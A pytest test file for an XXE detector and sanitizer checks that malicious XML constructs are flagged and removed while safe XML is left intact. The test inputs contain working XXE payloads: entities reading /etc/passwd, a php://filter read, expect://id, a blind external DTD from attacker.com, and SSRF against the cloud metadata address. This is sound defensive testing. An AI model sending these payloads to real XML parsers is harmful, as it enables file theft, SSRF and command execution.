"""
XXE (XML External Entity) sanitizer tests.
Tests for arcis/sanitizers/xxe.py
"""

import pytest
from arcis.sanitizers.xxe import detect_xxe, sanitize_xxe


class TestDetectXxe:
    """Tests for detect_xxe()."""

    # --- DOCTYPE declarations ---

    def test_detect_basic_doctype(self):
        assert detect_xxe("<!DOCTYPE foo>") is True

    def test_detect_doctype_with_entity(self):
        assert detect_xxe('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>') is True

    def test_detect_case_insensitive_doctype(self):
        assert detect_xxe("<!doctype html>") is True

    # --- ENTITY declarations ---

    def test_detect_entity_system(self):
        assert detect_xxe('<!ENTITY xxe SYSTEM "file:///etc/passwd">') is True

    def test_detect_entity_public(self):
        assert detect_xxe('<!ENTITY xxe PUBLIC "-//W3C//DTD" "http://example.com/evil.dtd">') is True

    def test_detect_parameter_entity(self):
        assert detect_xxe('<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">') is True

    # --- SYSTEM/PUBLIC references ---

    def test_detect_system_file(self):
        assert detect_xxe('SYSTEM "file:///etc/passwd"') is True

    def test_detect_system_http(self):
        assert detect_xxe('SYSTEM "http://169.254.169.254/"') is True

    def test_detect_public_uri(self):
        assert detect_xxe('PUBLIC "-//OASIS" "http://example.com"') is True

    # --- Parameter entity references ---

    def test_detect_entity_reference(self):
        assert detect_xxe("%xxe;") is True

    def test_detect_entity_reference_with_spaces(self):
        assert detect_xxe("% remote ;") is True

    # --- CDATA ---

    def test_detect_cdata(self):
        assert detect_xxe("<![CDATA[<script>alert(1)</script>]]>") is True

    # --- Full payloads ---

    def test_detect_classic_file_read(self):
        payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
        assert detect_xxe(payload) is True

    def test_detect_ssrf_via_xxe(self):
        payload = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>'
        assert detect_xxe(payload) is True

    def test_detect_blind_xxe(self):
        payload = '<!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]>'
        assert detect_xxe(payload) is True

    def test_detect_xxe_php_filter(self):
        payload = '<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">'
        assert detect_xxe(payload) is True

    def test_detect_xxe_expect(self):
        payload = '<!ENTITY xxe SYSTEM "expect://id">'
        assert detect_xxe(payload) is True

    # --- Safe inputs ---

    def test_safe_plain_text(self):
        assert detect_xxe("hello world") is False

    def test_safe_normal_xml(self):
        assert detect_xxe("<root><item>value</item></root>") is False

    def test_safe_html(self):
        assert detect_xxe('<div class="test">content</div>') is False

    def test_safe_xml_pi(self):
        assert detect_xxe('<?xml version="1.0" encoding="UTF-8"?>') is False

    def test_safe_word_system(self):
        assert detect_xxe("The system is running") is False

    def test_safe_percent_sign(self):
        assert detect_xxe("100% complete") is False

    def test_non_string_input(self):
        assert detect_xxe(123) is False
        assert detect_xxe(None) is False


class TestSanitizeXxe:
    """Tests for sanitize_xxe()."""

    def test_remove_doctype(self):
        assert sanitize_xxe("<!DOCTYPE foo><root/>") == "<root/>"

    def test_remove_doctype_with_subset(self):
        result = sanitize_xxe('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root/>')
        assert result == "<root/>"

    def test_remove_entity(self):
        assert sanitize_xxe('<!ENTITY xxe SYSTEM "file:///etc/passwd">') == ""

    def test_remove_cdata(self):
        assert sanitize_xxe("before<![CDATA[evil]]>after") == "beforeafter"

    def test_remove_multiple_constructs(self):
        result = sanitize_xxe('<!DOCTYPE a><!ENTITY b SYSTEM "x"><root/>')
        assert result == "<root/>"

    def test_remove_full_payload_preserve_body(self):
        input_xml = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><name>test</name></user>'
        result = sanitize_xxe(input_xml)
        assert result == "<user><name>test</name></user>"

    def test_preserve_normal_xml(self):
        xml = "<root><item>value</item></root>"
        assert sanitize_xxe(xml) == xml

    def test_preserve_plain_text(self):
        assert sanitize_xxe("hello world") == "hello world"

    def test_preserve_xml_with_pi(self):
        xml = '<?xml version="1.0"?><root/>'
        assert sanitize_xxe(xml) == xml

    def test_empty_string(self):
        assert sanitize_xxe("") == ""

    def test_non_string_raises(self):
        with pytest.raises(TypeError):
            sanitize_xxe(42)
